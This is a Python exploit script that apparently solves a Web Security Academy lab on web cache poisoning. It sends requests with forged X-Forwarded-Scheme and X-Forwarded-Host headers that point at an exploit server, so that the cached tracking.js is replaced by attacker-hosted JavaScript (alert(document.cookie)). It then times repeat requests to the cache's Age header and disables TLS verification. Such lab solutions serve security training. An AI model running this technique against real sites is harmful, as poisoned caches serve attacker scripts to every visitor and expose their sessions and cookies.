import http.client
import ssl
import time

LAB_ID = "???"
EXPLOIT_SERVER_ID = "???"


def GET_(
        path: str,
) -> http.client.HTTPResponse:
    method = 'GET'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
        'x-forwarded-scheme': 'http',
        'x-forwarded-host': f'exploit-{EXPLOIT_SERVER_ID}.exploit-server.net'
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


path = "/resources/js/tracking.js"
print("Exploit:")
print("File:")
print(path)
print(f"""
HTTP/1.1 200
Content-Type: application/javascript; charset=utf-8
""")
print("Body:")
print(f"""
alert(document.cookie)
""")
input("setup exploit and hit enter")
for i in range(5):
    response = GET_(path)
    print(f"response: {response.status}")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    print(response.read().decode())
    time.sleep(30 - int(response.headers['age']) + 1)
